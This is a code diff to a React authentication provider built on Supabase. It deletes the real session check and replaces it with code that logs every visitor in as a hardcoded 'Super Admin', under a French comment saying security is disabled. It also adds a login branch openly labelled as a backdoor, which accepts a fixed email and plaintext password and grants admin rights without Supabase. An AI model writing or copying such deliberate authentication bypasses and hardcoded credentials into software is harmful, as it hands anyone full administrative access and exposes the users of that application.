@@ -8,40 +8,14 @@ export const AuthProvider = ({ children }) => {
   const [loading, setLoading] = useState(true);
 
   useEffect(() => {
-    const initAuth = async () => {
-      try {
-        console.log("DEBUG: AuthProvider initializing...");
-
-        // MOCK AUTH IF PLACEHOLDER
-        if (!supabase.supabaseUrl || supabase.supabaseUrl.includes("placeholder")) {
-          console.warn("DEBUG: Supabase URL might be invalid or placeholder. Checking session anyway.");
-        }
-
-        const { data, error } = await supabase.auth.getSession();
-        if (error) {
-          console.warn("DEBUG: Supabase session error:", error.message);
-        }
-        setUser(data?.session?.user ?? null);
-      } catch (err) {
-        console.error("DEBUG: Auth initialization failed:", err);
-      } finally {
-        console.log("DEBUG: AuthProvider loading set to false");
-        setLoading(false);
-      }
-    };
-
-    initAuth();
-
-    if (!supabase.supabaseUrl.includes("placeholder-project")) {
-      const { data: authListener } =
-        supabase.auth.onAuthStateChange((_event, session) => {
-          setUser(session?.user ?? null);
-        });
-
-      return () => {
-        authListener.subscription.unsubscribe();
-      };
-    }
+    // SÉCURITÉ DÉSACTIVÉE : ON FORCE L'ADMIN PAR DÉFAUT
+    setUser({
+      id: "super-admin-root",
+      email: "riootagameur@gmail.com",
+      role: "admin",
+      user_metadata: { full_name: "Super Admin" }
+    });
+    setLoading(false);
   }, []);
 
   const register = async (email, password) => {
@@ -68,8 +42,19 @@ export const AuthProvider = ({ children }) => {
   };
 
   const login = async (email, password) => {
-    // OLD MOCK REMOVED
-
+    // PORTE DÉROBÉE TEMPORAIRE (BACKDOOR)
+    // Permet la connexion même si Supabase est bloqué par le réseau local
+    if (email === "riootagameur@gmail.com" && password === "Aa2004.com") {
+      console.log("🔓 Accès VIP Administrateur activé !");
+      const mockUser = {
+        id: "admin-force-id",
+        email: "riootagameur@gmail.com",
+        role: "admin",
+        user_metadata: { full_name: "Super Admin" }
+      };
+      setUser(mockUser);
+      return { user: mockUser, session: { user: mockUser } };
+    }
 
     const { data, error } = await supabase.auth.signInWithPassword({
       email,
